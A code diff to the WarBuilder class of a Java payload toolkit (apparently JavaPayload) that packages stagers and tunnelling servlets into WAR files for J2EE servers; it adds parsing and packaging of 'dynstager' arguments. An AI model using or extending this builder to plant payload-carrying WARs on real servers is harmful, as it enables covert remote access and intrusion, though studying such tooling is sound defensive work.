@@ -34,6 +34,7 @@
 
 package j2eepayload.builder;
 
+import j2eepayload.dynstager.DynstagerSupportBuilder;
 import j2eepayload.servlet.ApacheFindSockServlet;
 import j2eepayload.servlet.CamouflageTunnelServlet;
 import j2eepayload.servlet.FindSockServlet;
@@ -56,7 +57,7 @@ public class WarBuilder extends Builder {
 
 	public static void main(String[] args) throws Exception {
 		if (args.length == 0) {
-			System.out.println("Usage: java j2eepayload.builder.WarBuilder [<filename>.war] [--strip] <stager> [<moreStagers...>] [-- <startupStage> <stageOptions>]");
+			System.out.println("Usage: java j2eepayload.builder.WarBuilder [<filename>.war] [--strip] <stager> [<moreStagers...>] [<dynstagers>_ <dynstagerArgs>] [-- <startupStage> <stageOptions>]");
 			return;
 		}
 		new WarBuilder().build(args);
@@ -67,7 +68,7 @@ public class WarBuilder extends Builder {
 	}
 	
 	public String getParameterSyntax() {
-		return "[<filename>.war] [--strip] <stager> [<moreStagers...>] [-- <startupStage> <stageOptions>]";
+		return "[<filename>.war] [--strip] <stager> [<moreStagers...>] [<dynstagers>_ <dynstagerArgs>] [-- <startupStage> <stageOptions>]";
 	}
 	
 	public void build(String[] args) throws Exception {
@@ -84,6 +85,19 @@ public class WarBuilder extends Builder {
 			}
 			if (args[i].equals("--")) {
 				startupArgsStart = i+1;
+				break;
+			}
+			if (args[i].endsWith("_")) {
+				List dynstagerArgs = new ArrayList();
+				for(int j = i+1; j < args.length; j++) {
+					if (args[j].equals("--")) {
+						startupArgsStart = j+1;
+						break;
+					}
+					dynstagerArgs.add(args[j]);
+				}
+				classes.add(DynLoader.loadStager(args[i]+"LocalTest", null, 0));
+				classes.add(DynstagerSupportBuilder.buildSupport(args[i], dynstagerArgs));
 				break;
 			}
 			if (!named) {
@@ -126,8 +140,10 @@ public class WarBuilder extends Builder {
 			classes.add(jtcpfwd.util.http.StreamingHTTPTunnelEngine.class);
 			classes.add(jtcpfwd.util.http.CamouflageHTTPTunnelEngine.class);
 		}
-		if (useTunnel || useCamouflageTunnel || useFindSock || useApacheFindSock) 
+		if (useTunnel || useCamouflageTunnel || useFindSock || useApacheFindSock) { 
 			classes.add(javapayload.stager.LocalTest.class);
+			classes.add(j2eepayload.dynstager.DynstagerSupport.class);
+		}
 		if (useTunnel || useCamouflageTunnel || usePayload || useFindSock || useApacheFindSock) 
 			classes.add(Stager.class);
 		String startupArgs = null;
